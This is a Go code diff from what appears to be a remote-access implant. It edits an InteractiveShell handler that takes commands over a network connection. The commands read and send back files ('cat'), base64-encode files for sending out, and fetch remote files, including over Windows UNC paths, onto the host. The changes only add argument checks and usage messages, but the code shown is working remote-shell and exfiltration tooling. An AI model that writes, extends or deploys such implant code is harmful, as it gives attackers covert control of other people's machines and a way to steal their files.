@@ -51,6 +51,8 @@ func ListDir(argv []string) (string, error) {
 
 	if len(argv) < 2 {
 		path = "./"
+	} else {
+		path = argv[1]
 	}
 
 	files, err := ioutil.ReadDir(path)
@@ -126,35 +128,46 @@ func InteractiveShell(conn net.Conn) {
 				Send(conn, dir)
 
 			case "cat":
-				buf, err := ioutil.ReadFile(argv[1])
-
-				if err != nil {
-					Send(conn, err.Error())
+				if len(argv) != 2 {
+					Send(conn, "Usage: cat <file>")
 				} else {
-					Send(conn, string(buf))
+
+					buf, err := ioutil.ReadFile(argv[1])
+
+					if err != nil {
+						Send(conn, err.Error())
+					} else {
+						Send(conn, string(buf))
+					}
 				}
 
 			case "base64":
-				base64, err := Encode(argv[1])
-
-				if err != nil {
-					Send(conn, err.Error())
+				if len(argv) != 2 {
+					Send(conn, "Usage: base64 <file>")
 				} else {
-					Send(conn, base64)
+					base64, err := Encode(argv[1])
+
+					if err != nil {
+						Send(conn, err.Error())
+					} else {
+						Send(conn, base64)
+					}
 				}
 
 			case "fetch":
-				if len(argv) == 3 {
+				if len(argv) != 3 {
+					Send(conn, "Usage: fetch <URI> <dest file>. "+
+						"UNC Paths allowed on Windows")
+				} else {
 					bytes, err := fetch.Get(argv[1], argv[2])
 
 					if err != nil {
 						Send(conn, err.Error())
 					} else {
-						msg := fmt.Sprintf("%d bytes copied to %s", bytes, argv[2])
+						msg := fmt.Sprintf("%d bytes copied to %s",
+							bytes, argv[2])
 						Send(conn, msg)
 					}
-				} else {
-					Send(conn, "This action requires 2 arguments")
 				}
 
 			case "sitrep":
